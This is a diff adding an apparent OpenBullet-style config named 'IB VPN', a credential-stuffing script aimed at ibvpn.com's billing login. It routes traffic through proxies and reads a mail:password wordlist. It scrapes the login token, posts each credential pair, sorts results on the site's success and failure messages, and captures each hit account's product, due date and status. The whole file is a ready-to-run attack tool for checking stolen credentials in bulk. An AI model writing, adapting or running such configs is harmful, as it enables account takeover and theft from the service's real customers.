@@ -1,0 +1,56 @@
+[SETTINGS]
+{
+  "Name": "IB VPN",
+  "SuggestedBots": 1,
+  "LastModified": "2018-08-25T02:11:17.2068814+00:00",
+  "AdditionalInfo": "",
+  "Author": "Tunacan",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST GET "https://www.ibvpn.com/billing/clientarea.php" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+PARSE "<SOURCE>" CSS "[name=\"token\"]" "vaule" 0 -> VAR "TOKEN" "" "" 
+REQUEST POST "https://www.ibvpn.com/billing/dologin.php" AutoRedirect=TRUE 
+  CONTENT "token=<TOKEN>&username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Host: www.ibvpn.com" 
+  HEADER "Origin: https://www.ibvpn.com" 
+  HEADER "Referer: https://www.ibvpn.com/billing/clientarea.php" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Login Details Incorrect. Please try again." 
+  KEYCHAIN Success OR 
+    KEY "Update Your Details" 
+REQUEST GET "https://www.ibvpn.com/billing/clientarea.php?action=products" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+PARSE "<SOURCE>" LR "<td data-title=\"Product/Service\"><strong>" "</strong></td>" Recursive=FALSE -> CAP "PRODUCT" "" "" 
+PARSE "<SOURCE>" LR "<td data-title=\"Next Due Date\">" "</td>" Recursive=FALSE -> CAP "NEXT DUE" ":" "" 
+PARSE "<SOURCE>" LR "<td data-title=\"Status\"><span class=\"label cancelled\">" "</span></td>" Recursive=FALSE -> CAP "STATUS" ":" "" 
